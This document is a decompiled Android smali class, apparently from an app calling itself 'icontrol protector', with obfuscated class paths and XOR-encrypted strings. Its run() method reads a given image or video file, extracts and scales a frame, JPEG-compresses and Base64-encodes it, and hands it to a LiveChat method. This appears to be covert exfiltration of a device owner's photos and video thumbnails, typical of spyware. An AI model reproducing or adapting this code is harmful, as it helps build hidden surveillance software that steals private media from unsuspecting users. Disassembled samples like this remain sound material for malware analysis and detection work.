.class Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;->f(Ljava/lang/String;Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Ljava/lang/String;

.field final synthetic f:Landroid/content/Context;

.field final synthetic g:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;


# direct methods
.method constructor <init>(Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;Ljava/lang/String;Landroid/content/Context;)V
    .locals 0

    .line 1
    iput-object p1, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->g:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;

    iput-object p2, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->e:Ljava/lang/String;

    iput-object p3, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->f:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 12

    .line 1
    const/16 v0, 0xe

    const/16 v1, 0x8

    :try_start_0
    new-array v2, v1, [B

    fill-array-data v2, :array_0

    new-array v3, v1, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    const/16 v2, 0x1c

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    new-instance v2, Ljava/io/File;

    iget-object v3, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->e:Ljava/lang/String;

    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-eqz v3, :cond_2

    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v3

    const-wide/16 v5, 0x0

    cmp-long v3, v3, v5

    if-lez v3, :cond_2

    new-array v3, v1, [B

    fill-array-data v3, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    new-array v4, v0, [B

    fill-array-data v4, :array_6

    new-array v5, v1, [B

    fill-array-data v5, :array_7

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->g:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;

    invoke-static {v3, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;->g(Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;Ljava/io/File;)Z

    move-result v3

    const/4 v4, 0x5

    const/4 v5, 0x0

    const/16 v6, 0xfa

    const/16 v7, 0x1c2

    const/16 v8, 0x50

    if-eqz v3, :cond_0

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/graphics/BitmapFactory;->decodeFile(Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object v2

    new-instance v3, Landroid/graphics/drawable/BitmapDrawable;

    invoke-static {}, Landroid/content/res/Resources;->getSystem()Landroid/content/res/Resources;

    move-result-object v9

    invoke-direct {v3, v9, v2}, Landroid/graphics/drawable/BitmapDrawable;-><init>(Landroid/content/res/Resources;Landroid/graphics/Bitmap;)V

    iget-object v2, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->g:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;

    invoke-virtual {v3}, Landroid/graphics/drawable/BitmapDrawable;->getBitmap()Landroid/graphics/Bitmap;

    move-result-object v3

    invoke-static {v2, v3, v7, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;->h(Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;Landroid/graphics/Bitmap;II)Landroid/graphics/Bitmap;

    move-result-object v2

    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v6, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    invoke-virtual {v2, v6, v8, v3}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    invoke-static {v2, v5}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->f:Landroid/content/Context;

    new-array v4, v4, [B

    fill-array-data v4, :array_8

    new-array v5, v1, [B

    fill-array-data v5, :array_9

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    iget-object v5, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->e:Ljava/lang/String;

    invoke-static {v3, v2, v4, v5}, Lcom/icontrol/protector/LiveChat;->l(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_2

    :catch_0
    move-exception v2

    goto/16 :goto_0

    :catch_1
    move-exception v0

    goto/16 :goto_1

    :cond_0
    iget-object v3, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->g:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;

    invoke-static {v3, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;->i(Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;Ljava/io/File;)Z

    move-result v3

    if-eqz v3, :cond_3

    new-instance v3, Landroid/media/MediaMetadataRetriever;

    invoke-direct {v3}, Landroid/media/MediaMetadataRetriever;-><init>()V

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v9}, Landroid/media/MediaMetadataRetriever;->setDataSource(Ljava/lang/String;)V

    iget-object v9, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->f:Landroid/content/Context;

    invoke-static {v2}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v10

    invoke-static {v9, v10}, Landroid/media/MediaPlayer;->create(Landroid/content/Context;Landroid/net/Uri;)Landroid/media/MediaPlayer;

    move-result-object v9

    invoke-virtual {v9}, Landroid/media/MediaPlayer;->getDuration()I

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_1

    const v2, 0xf4240

    int-to-long v10, v2

    const/4 v2, 0x2

    invoke-virtual {v3, v10, v11, v2}, Landroid/media/MediaMetadataRetriever;->getFrameAtTime(JI)Landroid/graphics/Bitmap;

    move-result-object v2

    iget-object v3, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->g:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;

    invoke-static {v3, v2, v7, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;->h(Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;Landroid/graphics/Bitmap;II)Landroid/graphics/Bitmap;

    move-result-object v2

    if-eqz v2, :cond_1

    const/4 v3, 0x1

    invoke-static {v2, v6, v7, v3}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v2

    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v6, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    invoke-virtual {v2, v6, v8, v3}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    invoke-static {v2, v5}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->f:Landroid/content/Context;

    new-array v4, v4, [B

    fill-array-data v4, :array_a

    new-array v5, v1, [B

    fill-array-data v5, :array_b

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    iget-object v5, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->e:Ljava/lang/String;

    invoke-static {v3, v2, v4, v5}, Lcom/icontrol/protector/LiveChat;->l(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_1
    invoke-virtual {v9}, Landroid/media/MediaPlayer;->release()V

    goto/16 :goto_2

    :cond_2
    new-array v2, v1, [B

    fill-array-data v2, :array_c

    new-array v3, v1, [B

    fill-array-data v3, :array_d

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v3, 0x1a

    new-array v3, v3, [B

    fill-array-data v3, :array_e

    new-array v4, v1, [B

    fill-array-data v4, :array_f

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0$b;->e:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :goto_0
    new-array v3, v1, [B

    fill-array-data v3, :array_10

    new-array v4, v1, [B

    fill-array-data v4, :array_11

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    new-array v0, v0, [B

    fill-array-data v0, :array_12

    new-array v1, v1, [B

    fill-array-data v1, :array_13

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_2

    :goto_1
    new-array v2, v1, [B

    fill-array-data v2, :array_14

    new-array v3, v1, [B

    fill-array-data v3, :array_15

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v3, 0x14

    new-array v3, v3, [B

    fill-array-data v3, :array_16

    new-array v1, v1, [B

    fill-array-data v1, :array_17

    invoke-static {v3, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_3
    :goto_2
    return-void

    nop

    :array_0
    .array-data 1
        -0x6ft
        -0x2t
        -0x1at
        0x7dt
        0x13t
        -0x3at
        0x6ft
        -0x6ft
    .end array-data

    :array_1
    .array-data 1
        -0x39t
        -0x69t
        -0x7dt
        0xat
        0x55t
        -0x51t
        0x3t
        -0xct
    .end array-data

    :array_2
    .array-data 1
        0x75t
        0x19t
        -0x7ct
        -0x52t
        -0x64t
        -0x34t
        0x12t
        -0x5bt
        0x37t
        0x4dt
        -0x5bt
        -0x39t
        0x1bt
        0x11t
        -0x63t
        0x49t
        -0x19t
        -0x1dt
        0x6dt
        0x27t
        0x5et
        0x67t
        0x12t
        -0x46t
        0x29t
        0x43t
        -0x49t
        -0x22t
    .end array-data

    :array_3
    .array-data 1
        -0x70t
        -0x5bt
        0x4t
        0x4bt
        0x3bt
        0x47t
        -0xct
        0x2ct
    .end array-data

    :array_4
    .array-data 1
        0x6bt
        0x2ft
        -0x1at
        0x3ct
        0x25t
        -0x46t
        -0x68t
        0x4ct
    .end array-data

    :array_5
    .array-data 1
        0x3dt
        0x46t
        -0x7dt
        0x4bt
        0x63t
        -0x2dt
        -0xct
        0x29t
    .end array-data

    :array_6
    .array-data 1
        0x69t
        0xat
        -0x1ct
        0x8t
        0x36t
        -0x3t
        0x4bt
        0x6dt
        0x17t
        0x79t
        -0x1t
        0x44t
        -0x49t
        0x6bt
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x71t
        -0x64t
        0x63t
        -0x14t
        -0x73t
        0x4bt
        -0x52t
        -0x40t
    .end array-data

    :array_8
    .array-data 1
        0x26t
        -0x1dt
        0x3ft
        0x42t
        0x76t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x52t
        -0x75t
        0x4at
        0x2ft
        0x14t
        0xat
        -0x36t
        0x12t
    .end array-data

    :array_a
    .array-data 1
        -0x41t
        -0x7at
        -0x64t
        -0x74t
        -0x50t
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x35t
        -0x12t
        -0x17t
        -0x1ft
        -0x2et
        -0x4t
        -0x47t
        -0x59t
    .end array-data

    :array_c
    .array-data 1
        0x78t
        -0x30t
        -0x47t
        -0x52t
        0x31t
        -0x18t
        -0x14t
        0x21t
    .end array-data

    :array_d
    .array-data 1
        0x2et
        -0x47t
        -0x24t
        -0x27t
        0x77t
        -0x7ft
        -0x80t
        0x44t
    .end array-data

    :array_e
    .array-data 1
        -0x5at
        -0x2dt
        -0x66t
        -0x5bt
        -0x4at
        -0x31t
        0x2et
        -0x5ct
        -0x33t
        -0x60t
        -0x50t
        -0x27t
        -0x18t
        -0x1bt
        0x62t
        -0x6t
        -0x38t
        -0x2dt
        -0x7t
        -0x7t
        -0x49t
        -0x62t
        0x63t
        -0x5at
        0x7at
        0x65t
    .end array-data

    nop

    :array_f
    .array-data 1
        0x40t
        0x45t
        0x1dt
        0x41t
        0xdt
        0x79t
        -0x36t
        0x1ct
    .end array-data

    :array_10
    .array-data 1
        -0x13t
        0x19t
        0x20t
        0x1at
        -0x3at
        0x7t
        -0x7ct
        0x47t
    .end array-data

    :array_11
    .array-data 1
        -0x45t
        0x70t
        0x45t
        0x6dt
        -0x80t
        0x6et
        -0x18t
        0x22t
    .end array-data

    :array_12
    .array-data 1
        0x6bt
        0x55t
        -0x25t
        -0xet
        -0x5et
        0x43t
        0x69t
        0x13t
        0xct
        0x37t
        -0x27t
        -0x53t
        0x16t
        -0x2dt
    .end array-data

    nop

    :array_13
    .array-data 1
        -0x72t
        -0x2et
        0x61t
        0x15t
        0x2ct
        -0xdt
        -0x74t
        -0x51t
    .end array-data

    :array_14
    .array-data 1
        0x3dt
        0x6ft
        -0x66t
        0x63t
        -0x7dt
        -0x4ft
        -0x76t
        -0x28t
    .end array-data

    :array_15
    .array-data 1
        0x6bt
        0x6t
        -0x1t
        0x14t
        -0x3bt
        -0x28t
        -0x1at
        -0x43t
    .end array-data

    :array_16
    .array-data 1
        0x19t
        0x7et
        0x21t
        -0x1et
        0x27t
        -0x75t
        -0x31t
        -0x1at
        0x5et
        0x1dt
        0x23t
        -0x43t
        0x63t
        -0x79t
        -0x50t
        -0x4ct
        0x53t
        0x57t
        -0x62t
        0x27t
    .end array-data

    :array_17
    .array-data 1
        -0x4t
        -0x8t
        -0x5ct
        0x7t
        -0x76t
        0x13t
        0x29t
        0x5ct
    .end array-data
.end method
